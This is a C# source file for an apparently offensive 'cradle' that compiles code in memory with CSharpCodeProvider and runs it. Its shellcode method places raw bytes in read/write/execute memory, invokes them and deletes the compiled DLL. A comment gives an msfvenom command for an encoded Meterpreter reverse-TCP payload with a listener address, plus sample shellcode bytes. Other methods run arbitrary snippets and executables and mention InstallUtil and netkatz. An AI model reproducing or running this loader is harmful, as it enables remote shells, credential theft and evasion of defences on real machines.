using System;
using System.IO;
using System.Reflection;
using System.CodeDom.Compiler;
using System.Linq;
using AppDomainToolkit;
using System.Collections.Generic;
using System.Threading;
using System.Diagnostics;

namespace Cradle
{

    public static class DynCSharpRunner
    {
        // Method 1. below
        // Method 2. https://holdmybeer.xyz/2016/09/11/c-to-windows-meterpreter-in-10mins/ 
        internal static bool CompileRunShellCode(string ShellCode)
        {
            /* Example:
                private WorkThreadFunction(ShellCode){
                    DynCSharpRunner.CompileRunShellCode(ShellCode);
                }
               //msfvenom  -p windows/meterpreter/reverse_tcp --platform windows ReverseConnectRetries=255  PrependMigrate=true  LHOST=172.16.56.230 LPORT=1337 -e x86/shikata_ga_nai -i 3 -f  csharp 
                String ShellCode = @"
                    0xdb,0xc0,0xb8,0x22,0x07,0x27,0xf3,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,
                    0x61,0x31,0x46,0x1a,0x83,0xc6,0x04,0x03,0x46,0x16,0xe2,0xd7,0xba,0x1c,0x88,
                    0xb0,0x69,0xed,0x38,0xfb,0x8e,0x25,0x5a,0x04 ....
                    ";


                    Thread thread = new Thread(new ThreadStart(WorkThreadFunction));
                    thread.IsBackground = true;
                    thread.Start();
            */

            // What assembly we are in, do not include on load;
            Assembly currentAssem = Assembly.GetExecutingAssembly();
            String[] referencedAssemblies =
                         AppDomain.CurrentDomain.GetAssemblies()
                        .Where(a => !a.FullName.StartsWith("mscorlib", StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.IsDynamic) //necessary because a dynamic assembly will throw and exception when calling a.Location
                        .Select(a => a.Location)
                        .ToArray();

            using (var context = AppDomainContext.Create())
            {

                #region ScriptText
                String SnippetPreamble = @"
                            namespace DynamicShellCode {

                              using System;
                              using System.IO.MemoryMappedFiles;
                              using System.Runtime.InteropServices;

                              public class DynamicShellCodeCompile{ 

                                private delegate IntPtr GetPebDelegate();
                                public void GetResults(){
                                        this.GetPeb();
                                }
                                private unsafe IntPtr GetPeb()
                                {
                                   var shellcode = new byte[]
                                   {
                            ";

                String SnippetPostAmble = @" 
                                   };
 
                                   MemoryMappedFile mmf = null;
                                   MemoryMappedViewAccessor mmva = null;
                                   try
                                   {
                                        // Create a read/write/executable memory mapped file to hold our shellcode..
                                        mmf = MemoryMappedFile.CreateNew(""__shellcode"", 
                                                    shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

                                        // Create a memory mapped view accessor with read/write/execute permissions..
                                        mmva = mmf.CreateViewAccessor(0, shellcode.Length, 
                                                    MemoryMappedFileAccess.ReadWriteExecute);

                                        // Write the shellcode to the MMF..
                                        mmva.WriteArray(0, shellcode, 0, shellcode.Length);

                                        // Obtain a pointer to our MMF..
                                        var pointer = (byte*)0;
                                        mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

                                        // Create a function delegate to the shellcode in our MMF..
                                        var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), 
                                                                    typeof(GetPebDelegate));

                                        // Invoke the shellcode..
                                        return func();
                                    }
                                    catch
                                    {
                                        return IntPtr.Zero;
                                    }
                                    finally
                                    {
                                        mmva.Dispose();
                                        mmf.Dispose();
                                    }
                                }
                              }
                            }
                            ";

                String SourceCode = SnippetPreamble + ShellCode + SnippetPostAmble;

                #endregion ScriptText

                Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });


                CompilerParameters parameters = new CompilerParameters(
                    referencedAssemblies);

                parameters.GenerateInMemory = true;
                parameters.GenerateExecutable = false;
                parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true); // Where to generate temp files, and whether to leave them
                                                                                         // parameters.CompilerOptions += "/optimize+ ";
                                                                                         //parameters.CompilerOptions += "/target:module"; // Need to see how to transfer and assemble
                parameters.CompilerOptions += "/nologo /unsafe";
                // Loader wants ".dll" or ".exe" in assembly name although .NEt does not care
                String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                parameters.OutputAssembly = aPathName; // Name of the assembly to generate
                                                       //Console.WriteLine("Temp file name {0}", aPathName);

                // The call to compiler

                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);
                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return false;
                }

                // call to .CompiledAssembly loads assembly into memory. Now we are releasing locks on assembly file
                var type = cr.CompiledAssembly.GetType("DynamicShellCode.DynamicShellCodeCompile");

                // Delete assembly
                FileInfo fi = new FileInfo(aPathName);
                // Console.WriteLine("Exists? {0}", fi.Exists);
                // Console.WriteLine(aPathName);
                File.Delete(aPathName);

                object[] constructorArgs = new object[] { };
                dynamic instance = Activator.CreateInstance(type, constructorArgs);
                try
                {
                    Thread thread = new Thread(() => SCRunner(instance));
                    thread.IsBackground = true;
                    thread.Start();

                }
                catch { }

                //instance.GetResults();
            }

            return true;
        }
        private static void SCRunner(dynamic inst)
        {
            try
            {
                Console.WriteLine("\n--- Result ---");
                inst.GetResults();

            }catch { }
        }
        internal static bool CompileRunSnippet(string SnippetDirectives, string SnippetCode)
        {
            // What assembly we are in, do not include on load;
            Assembly currentAssem = Assembly.GetExecutingAssembly();
            String[] referencedAssemblies =
                         AppDomain.CurrentDomain.GetAssemblies()
                        .Where(a => !a.FullName.StartsWith("mscorlib", StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.IsDynamic) //necessary because a dynamic assembly will throw and exception when calling a.Location
                        .Select(a => a.Location)
                        .ToArray();

            if (ConfigUtil.DEBUG)
            {
                foreach (String ra in referencedAssemblies)
                {
                    Console.WriteLine("Including assembly: {0}", ra);
                }
            }
            using (var context = AppDomainContext.Create())
            {

                #region ScriptText
                String SnippetPreamble = @"
                            namespace Dynamic {
                              public class DynamicCompile: IDisposable{ 

                                private bool disposed = false;
                                public DynamicCompile(){
                                        // Console.WriteLine(""=== Dynamic CScript === "");
                                }                                
                                public void GetResults(){
                                    try {
                                    ";

                String SnippetPostAmble = @" 
                                    }catch(Exception e){
                                        Console.WriteLine(""Exception : {0} "", e);
                                    }
                                } 

                                //Implement IDisposable.
                                public void Dispose()
                                {
                                    Dispose(true);
                                    GC.SuppressFinalize(this);
                                }

                                protected virtual void Dispose(bool disposing)
                                {
                                    if (!disposed)
                                    {
                                        if (disposing)
                                        {
                                            // Free other state (managed objects).
                                        }
                                        // Free your own state (unmanaged objects).
                                        // Console.WriteLine(""=== End Dynamic CScript === "");
                                        disposed = true;
                                    }
                                }

                                // Use C# destructor syntax for finalization code.
                                ~DynamicCompile(){
                                    // Simply call Dispose(false).
                                    Dispose (false);
                                }
                              } 
                            }";

                String SourceCode = SnippetDirectives + SnippetPreamble + SnippetCode + SnippetPostAmble;

                #endregion ScriptText

                Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });


                CompilerParameters parameters = new CompilerParameters(
                    referencedAssemblies);

                /*
                 * λ dir "C:\Users\dimas\AppData\Local\Temp\tmp*"
                     Volume in drive C has no label.
                     Volume Serial Number is ECBC-2429

                     Directory of C:\Users\dimas\AppData\Local\Temp

                    08/12/2017  10:31 PM                 0 tmp16A6.tmp
                    08/12/2017  10:30 PM                 0 tmpF581.tmp
                    08/12/2017  10:32 PM             2,080 1vvp5flt.0.cs

                If temp files are preserved we see:
                    08/12/2017  10:32 PM               778 1vvp5flt.cmdline
                    08/12/2017  10:32 PM                 0 1vvp5flt.err
                    08/12/2017  10:32 PM             1,353 1vvp5flt.out
                    08/12/2017  10:32 PM                 0 1vvp5flt.tmp
                    */
                parameters.GenerateInMemory = true;
                parameters.GenerateExecutable = false;
                parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true); // Where to generate temp files, and whether to leave them
                                                                                         // parameters.CompilerOptions += "/optimize+ ";
                                                                                         //parameters.CompilerOptions += "/target:module"; // Need to see how to transfer and assemble
                parameters.CompilerOptions += "/nologo  /unsafe";
                // Loader wants ".dll" or ".exe" in assembly name although .NEt does not care
                String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                parameters.OutputAssembly = aPathName; // Name of the assembly to generate
                                                       //Console.WriteLine("Temp file name {0}", aPathName);

                // The call to compiler

                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);
                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return false;
                }

                // call to .CompiledAssembly loads assembly into memory. Now we are releasing locks on assembly file
                var type = cr.CompiledAssembly.GetType("Dynamic.DynamicCompile");

                // Delete assembly
                FileInfo fi = new FileInfo(aPathName);
                // Console.WriteLine("Exists? {0}", fi.Exists);
                // Console.WriteLine(aPathName);
                File.Delete(aPathName);

                object[] constructorArgs = new object[] { };
                dynamic instance = Activator.CreateInstance(type, constructorArgs);

                Console.WriteLine("\n--- Result ---");
                instance.GetResults();

                // Dispose of instances. For rapid fire of calls.
                instance.Dispose();
                //GC.Collect();
                //GC.WaitForPendingFinalizers();
            }

            return true;
        }


        internal static bool CompileRunSource(string SourceCode, String TypeToRun, bool isExe)
        {
            Console.WriteLine("Type to run: {0}", TypeToRun);
            // What assembly we are in, do not include on load;
            Assembly currentAssem = Assembly.GetExecutingAssembly();
            String[] referencedAssemblies =
                         AppDomain.CurrentDomain.GetAssemblies()
                        .Where(a => !a.FullName.StartsWith("mscorlib", StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.IsDynamic) //necessary because a dynamic assembly will throw and exception when calling a.Location
                        .Select(a => a.Location)
                        .ToArray();

            if (ConfigUtil.DEBUG)
            {
                foreach (String ra in referencedAssemblies)
                {
                    Console.WriteLine("Including assembly: {0}", ra);
                }
            }
            using (var context = AppDomainContext.Create())
            {

                Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });

                CompilerParameters parameters = new CompilerParameters(
                    referencedAssemblies);

                // for InstallUtil - netkatz
                parameters.ReferencedAssemblies.Add("System.Configuration.Install.dll");

                parameters.GenerateInMemory = true;
                if (isExe)
                {
                    parameters.GenerateExecutable = true;
                }else
                {
                    parameters.GenerateExecutable = false;

                }
                parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true); // Where to generate temp files, and whether to leave them
                                                                                         // parameters.CompilerOptions += "/optimize+ ";
                                                                                         //parameters.CompilerOptions += "/target:module"; // Need to see how to transfer and assemble
                parameters.CompilerOptions = "/unsafe+";
                // Loader wants ".dll" or ".exe" in assembly name although .NEt does not care
                String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                parameters.OutputAssembly = aPathName; // Name of the assembly to generate
                                                       //Console.WriteLine("Temp file name {0}", aPathName);

                // The call to compiler

                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);
                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return false;
                }

                if (!isExe)
                {
                    // call to .CompiledAssembly loads assembly into memory. Now we are releasing locks on assembly file
                    var type = cr.CompiledAssembly.GetType(TypeToRun);

                    // Delete assembly
                    FileInfo fi = new FileInfo(aPathName);
                    // Console.WriteLine("Exists? {0}", fi.Exists);
                    // Console.WriteLine(aPathName);
                    File.Delete(aPathName);

                    object[] constructorArgs = new object[] { };
                    try
                    {
                        dynamic instance = Activator.CreateInstance(type, constructorArgs);
                        Console.WriteLine("\n--- Result ---");
                        instance.PreLaunch(); // The pre method should always be this <-
                        instance.RunCode();   // The method should always be this <-
                        instance.PostLaunch(); // The post method should always be this <-
                        instance = null;

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                else
                {

                    // EXE - no guarantees to memory exec of the wrapper.
                    Console.WriteLine("Location {0}", aPathName);
                    String exeName = String.Join(".", aPathName, "exe");
                    Console.WriteLine("Location (EXE) {0}", exeName);
                    try
                    {

                            File.Move(aPathName, exeName);
                            ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
                            startInfo.WindowStyle = ProcessWindowStyle.Normal;
                            startInfo.UseShellExecute = true;
                            startInfo.CreateNoWindow = false;
                            startInfo.WindowStyle = ProcessWindowStyle.Normal;
                            Process exeProc = Process.Start(startInfo);

                            //Process proc = Process.Start(aPathName);
                            //proc.WaitForExit();
                            //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U 
                            /*ProcessStartInfo startInfo = new ProcessStartInfo(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe");
                            startInfo.Arguments = " /logfile= /LogToConsole=true /U " + "\"" +  aPathName + "\"";
                            startInfo.UseShellExecute = false;
                            startInfo.WindowStyle = ProcessWindowStyle.Normal;
                            startInfo.LoadUserProfile = true;
                            Process.Start(startInfo);*/

                            //var inst = cr.CompiledAssembly.CreateInstance("PELoader.Sample");
                            //MethodInfo mi = cr.CompiledAssembly.EntryPoint;
                            //mi.Invoke(inst, null);
                        }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
               

            }

            return true;
        }

    }

}
